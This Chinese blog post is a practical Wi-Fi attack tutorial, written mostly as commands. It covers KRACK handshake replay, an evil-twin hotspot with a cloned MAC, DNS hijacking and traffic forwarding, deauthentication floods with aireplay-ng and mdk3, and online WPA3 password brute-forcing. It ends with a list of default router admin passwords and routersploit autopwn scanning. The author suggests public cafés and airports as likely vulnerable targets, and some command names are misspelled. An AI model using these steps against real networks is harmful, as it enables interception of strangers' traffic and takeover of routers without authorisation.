# 原创
：  无线渗透|Wi-Fi渗透思路

# 无线渗透|Wi-Fi渗透思路

对于WPA2 WPA3的一些渗透思路

## **0x00 进行渗透时需知晓的基础知识**

1.WPA2:是WPA的升级版，是针对保护无线网络安全而设计的无线网络保护系统，引入了PSK（预共享密钥模式）秘钥，加强了WPA的不足之处，但是因为使用了PSK，所以只要攻击者知晓目标的PSK秘钥，就能十分轻易加入无线网络。

2.WPA3:是近几年新出现的无线网络安全保护系统，在WPA2的基础上实现了针对字典法暴力密码破解的难度，如果失败次数过多，AP将直接锁定攻击行为，以及取代了PSK使用对等实体验证（SAE）。

3.AP:特指无线网络接入点，就是路由器等设备的广泛称呼。

**PS.实现无线网络攻击一般都需要两张或更多网卡，有时候也需要一些社工手段！购买无线网卡强烈建议购买支持802.11ac协议的网卡！！！**

## **0x01 WPA2渗透思路**

如果实在嫌跑密码的进度过慢或者没有好的字典，可以试一试wpa2的秘钥重装攻击(KRACK)<br/> PS.本文所用的方法绝大部分没有使用大佬提供的POC,旨为了能够完全细化并理解KRACK攻击的步骤

## **0x02 秘钥重装攻击复现步骤：**

秘钥重装攻击（KRACK）：<br/> 此攻击针对WPA2协议中创建一个Nonce（一种共享密钥）的四次握手。

## **0x03 KRACK的原理：**

WPA2的标准预期有偶尔发生的Wi-Fi断开连接，并允许使用同样的值重连第三次握手，以做到快速重连和连续性。因为标准不要求在此种重连时使用不同密钥，所以可能出现重放攻击。<br/> 攻击者还可以反复重发另一设备的第三次握手来重复操纵或重置WPA2的加密密钥。每次重置都会使用相同的值来加密数据，因此可以看到和匹配有相同数据的块，识别出被加密密钥链的数据块。随着反复的重置暴露越来越多的密钥链，最终整个密钥链将被获知，攻击者将可读取目标在此连接上的所有流量。<br/> WPA2通常用于移动设备至固定接入点或家庭路由器的连接，尽管某些流量本身可能被SSL/TLS等协议加密，但风险仍十分严重。（资料来自百度百科）

1.启动网卡的混杂模式

```
sudo airmong-ng start &lt;device1&gt;
```

<br/> 2.对目标AP进行信息收集<br/> 先用

```
sudo airodump-ng &lt;device1&gt;
```

3.找到目标AP的BSSID

<br/> 这是我家中的2.4g无线网络，第一个使用桥接模式桥接了CMCC,因为两个路由器都已经安装了最新的固件把秘钥重装漏洞修复了，所以该次实验不会对我的路由器与设备造成损伤或是成功渗透，但是针对现实中像是咖啡店、机场、图书馆类的场景，路由器的固件很有可能并没有升级到最新版本，所以该攻击可能依然有效

4.锁定目标BSSID后，使用

```
sudo airodump-ng &lt;device1&gt; --bssid=&lt;target bssid&gt;
```

5.嗅探该AP中的所有成员

<br/> 如果没有成员的话可以插拔一下网卡（我才不会因为在复现过程中没看到网卡关闭等了十几分钟这件事说出来）

6.克隆Wi-Fi钓鱼热点<br/> 需要伪造一个同名，同mac地址的钓鱼热点<br/> 更改网卡mac地址步骤：

```
sudo ifconfig device2 down
sudo macchaner device2 -m &lt;newmac&gt; //注意，请将这里的newmac更改为目标AP点的mac地址
sudo ifconfig device2 up
```

伪造热点：

```
sudo airmong start wlan2 //开启网卡的监听模式
sudo airbase-ng -e &lt;target SSID&gt; -c &lt;channel&gt; &lt;device2&gt; //讲trget SSID更改为目标SSID，并且channel更改成不同的信道
sudo ifconfig at0 up //启动虚拟网关
sudo vi /etc/network/interfaces
------------------------------
//配置虚拟网卡地址参数
auto at0
iface at0 inet static
address 192.168.199.1 //这里最好与目标ap点的管理页面一样
netmask 255.255.255.0
------------------------------
sudo service networking restart //重启网卡服务
ifconfig at0查看at0网卡，如果没有ip地址或者不存在，重试以上步骤,注意！必须先使用airbase-ng创建AP点,at0网卡才会被可用！
```

配置DHCP:

```
sudo vi /etc/dhcp/dhcpd.conf
设置子网 掩码 分配地址范围等
在里面添加：
subnet 192.168.199.0 netmask 255.255.255.0{
range 192.168.199.100 192.168.199.150;
option routers 192.168.199.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 192.168.178.99; //注意这里的doamin地址需要自己更换
}
```

```
进入下一配置文件，将at0指定为dhcp请求网卡
sudo vi /etc/default/isc-dhcp-server
将其中的INTERFACESv4=""更改为INTERFACESv4="at0"
```

```

sudo service isc-dhcp-server restart //重启dhcp服务
```

### 配置dnsmasq

```
sudo vi /etc/dnsmasq.conf
添加以下内容:
resolv-file=/etc/resolv.conf //设置resolv目录
strict-order
listen-address=192.168.199.113 //这个ip是本机ip，如果只想本地访问可以填写127.0.0.1

address=/baidu.com/192.168.178.99 //注意，这一步很重要，需要在这里设置泛解析
address=/111.com/220.181.38.148

server=8.8.8.8
//设置谷歌dns为首选dns
server=114.114.114.114

sudo vi /etc/resolv.conf
添加nameserver为本机ip地址
```

<br/> 重启dnsmasq服务

```
sudo service dnsmasq restart
```

设置iptables进行流量转发:

```
//使用iptables编写规则：
iptables -t nat -A POSTROUTING -s 192.168.199.0/24 -j SNAT --to 192.168.178.99

iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
//对eth0进行源nat
iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
//转发能上网的无线网卡流量
iptables -A FORWARD -p tcp --syn -s 192.168.199.0/24 -j TCPMSS --set-mss 1356
iptables-save //保存
```

克隆Wi-Fi后成功获取到成员进入网络提示信息<br/>  

<br/> 7.但是我们也不能白等新的冤大头连上我们的热点，所以我们可以对目标AP的成员使用断网攻击使其强制掉线重连<br/> aireplay-ng攻击：

```
//先对目标AP进行锁定监听并保存抓到的握手包
sudo airodump-ng &lt;device1&gt; --bssid=&lt;target bssid&gt; --channel=&lt;channel&gt; -w &lt;文件保存路径&gt;
//然后打开一个新的命令窗口进行攻击
sudo aireplay-ng -0 0 -a &lt;target AP BSSID&gt; -c &lt;target member MAC&gt; &lt;device1&gt;
```

mdk3/mdk4攻击：

```
vi blacklist //创建一个黑名单文件，并且把目标的BSSID填进去
sudo mdk3 &lt;device&gt; d -s 1000 -b blacklist.txt -c &lt;target channel&gt; //执行攻击
//mdk4同理,只需要把mdk3换成mdk4
```

稍等一会后，所有目标均已离线，2.4gAP网络用户断网连接后一般来说都可以直接获取到握手包。<br/> 8.获取四次握手的数据包<br/> 当左上角出现：<br/>  

<br/> 就说明我们拿到了握手包<br/> 接着打开wireshak,将上一步的01号数据包到wireshark打开搜索字符串Message<br/> 需要找到<br/>  

<br/> 然后右键选择标记分组<br/>  

<br/> 之后选择左上角"文件"-&gt;导出特定分组-&gt;选择仅选中分组<br/>  

<br/> 保存第三条握手包<br/> 9.实行攻击<br/> （因为我这硬件条件实在不允许，就说一下实行攻击 的具体步骤，并且贴出大佬的POC吧）<br/> (1)使用scapy伪造含有CSA(信道切换公告)信标的beacon管理帧，使成员强制连接到钓鱼热点<br/> CSA信息元素：<br/>  

<br/> (2)向成员设备发送3号握手包多次，并允许1、2号握手包通过，阻断4号握手包使其强制安装秘钥

在此演示使用scapy发送三号握手包<br/>`sudo scapy //打开scapy`<br/>  

<br/> 在wireshark中我们可以看到Message 3 of 4被成功重传<br/>  

攻击完成，攻击者打开wireshark监听，可以发现成员在目标AP内浏览的所有TCP明文

秘钥归0POC项目链接:

https://github.com/vanhoefm/krackattacks-poc-zerokey<br/> KRACK攻击POC实例脚本地址:

https://github.com/vanhoefm/krackattacks-scripts

### **WPA3攻击思路**

因为Dragonblood漏洞组并没有公布相关的攻击方式与POC，所以这一节我们来了解一下我在github上找的一个WPA3在线字典攻击工具----wacker<br/> 在使用工具前，我们需要先编译作者自改的wpa_supplicant<br/> 首先下载工具

```

git clone https://github.com/blunderbuss-wctf/wacker.git
cd wacker
```

```

apt-get install -y pkg-config libnl-3-dev gcc libssl-dev libnl-genl-3-dev
cd wpa_supplicant-2.8/wpa_supplicant/
cp defconfig_brute_force .config
make -j4
ls -al wpa_supplicant
//执行玩上述步骤以构建wpa_supplicant后，我们就可以正常使用工具了
```

split.sh是用来为多个网卡进行分配破解工作而进行生成单次列表<br/> 使用：`sudo ./split.sh &lt;份数&gt; &lt;单词列表&gt;`<br/>  

<br/> wacker.py是程序本体<br/> 使用方法与选项：

`--wordlist &lt;wordlist&gt; 指定使用的字典<br/> --interface &lt;interface&gt; 指定使用的设备<br/> --bssid &lt;BSSID&gt; 指定目标的BSSID<br/> --ssid &lt;SSID&gt; WPA3的ssid<br/> --freq &lt;freq&gt; AP的频率<br/> --start &lt;START_WORD&gt; 从单词列表中的指定字符开始<br/> --debug 输出debug信息<br/> --wpa2 使用WPA2模式`

<br/> 使用例：

### **社会工程学/密码泄露手段**

俗话说得好，当你不知道的时候建议直接去问，这也同样适用直接询问Wi-Fi密码<br/> 还有一种手段那就是直接使用Wi-Fi万能钥匙等这种密码泄漏工具，使用手机自带的生成Wi-Fi二维码功能，再配合扫码就能直接得到密码。

### **路由器后台渗透思路**

在进入无线局域网后，我们可以对无线路由器的后台进行渗透，渗透后台的方法包括但不限于：漏洞、跑包、弱密码，后台密码很大概率会与Wi-Fi密码相同<br/> 这里贴出一些常用路由器的默认后台账号密码：

> 
`TP_LINK家用路由器:admin-admin<br/> TP_LINK企业级路由器:admin-admin123456或admin-123456admin<br/> Tenda路由器：admin-admin<br/> 360路由器:admin-admin<br/> 华为路由器:admin-admin<br/> Netcore路由器:guest-guest<br/> 小米：没密码<br/> FAST路由器:admin-admin<br/> D-Link路由器:admin-admin<br/> PHICOMM路由器:admin-admin`<br/>  


漏洞渗透思路：<br/> 谈到对路由器的漏洞攻击手段，不得不提到大名鼎鼎的routersploit<br/> routersploit项目地址:

https://github.com/threat9/routersploit.git<br/> routersploit的安装(kali下):

```
git clone https://github.com/threat9/routersploit.git
cd routersploit
pip3 install -r requirements.txt
```

routersploit的使用:

```
sudo ./rsf.py //开启routersplot
use scanners/autopwn //执行自动扫描模块
show option //查看设置
```

```
set target &lt;路由器后台地址&gt;
run //启动扫描
```

<br/> 耐心等待扫描结束，如果该漏洞对路由器有效的话，会直接列出来，如果可能对该路由器有用会列出可能有效的漏洞<br/>  

<br/> 当routersploit无法胜任时，还有一个汇总各大路由器漏洞的网站:http://routerpwn.com/

```
来源：https://forum.butian.net/share/1819
```

声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**！

## **免费领取安全学习资料包！（私聊进群一起学习，共同进步）**<img alt="" height="768" src="https://img-blog.csdnimg.cn/eaa4e9e081db43e799fd087ed901e814.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/b4ae52d81c904a0e928d6c143a8acb66.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/72627dbe2e3845c8b93824c7ddfdf88e.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/3c0ac8f403054190b2c85c8fe950e272.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/89b893f020e042129fea9c4230cc2586.png" width="665"/>

应急响应笔记

学习路线
